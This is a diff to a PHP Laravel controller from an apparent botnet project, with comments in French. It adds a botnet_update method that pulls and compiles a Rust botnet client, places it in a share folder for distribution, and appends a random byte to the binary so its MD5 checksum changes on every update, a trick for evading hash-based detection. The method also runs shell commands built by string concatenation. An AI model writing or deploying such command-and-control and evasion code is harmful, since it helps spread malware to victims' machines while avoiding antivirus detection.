@@ -81,5 +81,88 @@ class BotnetController extends Controller
         return redirect('/home')->with('output', "Serveur stoppé.");
     }
 
+    public function botnet_update()
+    {
+        $path = env('PATH_RUST_CLIENT_EXECUTABLE');
+
+        if (!$path) {
+            return redirect('/home')->with('error', 'Path to Rust client executable not set.');
+        }
+
+        $result = [];
+
+        $fullpath = $path . 'PA-BOTNET-CLIENT-v2/';
+
+        $command = "cd $fullpath && git pull";
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'Git pull command failed.');
+        }
+        $result = array_merge($result, ['Client mis a jour avec le repo git']);
+
+
+
+
+        $command = "cd $fullpath && RUSTFLAGS='--cfg client_os=\"linux\"' cargo build --release";
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'Cargo build command failed.');
+        }
+        $result = array_merge($result, ['Client compilé avec cargo build --release']);
+
+
+        if (!is_dir(storage_path('BOTNET-SHARE'))) {
+            mkdir(storage_path('BOTNET-SHARE'), 0777, true);
+        }
+
+        $compiledFilePath = $fullpath . 'target/release/PA-BOTNET-CLIENT-v2';
+        $storagePath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');
+
+
+
+        $command = "rm ".$storagePath;
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'Git pull command failed.');
+        }
+        $result = array_merge($result, ['Old client removed']);
+
+
+        if (!copy($compiledFilePath, $storagePath)) {
+            return redirect('/home')->with('error', 'Failed to copy compiled file to storage.');
+        }
+        $result = array_merge($result,['API access mis a jour']);
+
+
+        $fileHandle = fopen($storagePath, 'a');
+        if ($fileHandle === false) {
+            return redirect('/home')->with('error', 'Failed to open copied file for appending.');
+        }
+
+        if (fwrite($fileHandle, "\x90".rand(1,10000)) === false) {
+            fclose($fileHandle);
+            return redirect('/home')->with('error', 'Failed to append byte to copied file.');
+        }
+        $result = array_merge($result,['Checksum modifié']);
+
+
+        $command = "md5sum ".$storagePath;
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'ERROR CHECK MD5');
+        }
+        $result = array_merge($result, ['Checksum  : '.$output[1]]);
+
+        fclose($fileHandle);
+
+
+
+        // Retourne avec les résultats
+        return redirect('/home')->with('output', $result);
+    }
+
+
+
+
 
 }
